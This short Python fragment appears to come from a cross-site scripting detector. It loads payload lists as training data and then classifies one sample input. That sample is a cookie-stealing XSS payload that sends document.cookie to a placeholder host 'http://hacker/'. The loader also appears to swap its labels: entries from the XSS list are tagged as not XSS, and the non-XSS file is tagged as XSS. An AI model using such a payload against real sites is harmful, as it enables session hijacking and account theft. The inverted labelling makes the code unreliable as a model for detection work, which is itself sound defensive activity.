...
def loadfile():
  textos=[]
  file1 = open('xsslist.txt', 'r') 
  Lines = file1.readlines()  
  for line in Lines: 
      intrusion = [line.strip(), 'Not Cross-Site Scripting (XSS)']
      textos.append(intrusion)
  file2 = open('NOTXSS', 'r') 
  Lines = file2.readlines()  
  for line in Lines: 
      intrusion = [line.strip(), 'Cross-Site Scripting (XSS)']
      textos.append(intrusion)
...
clase=clasificar("><SCRIPT> var+img=new+Image(); img.src='http://hacker/'%20+%20document.cookie; </SCRIPT>",p,c,t,tp)
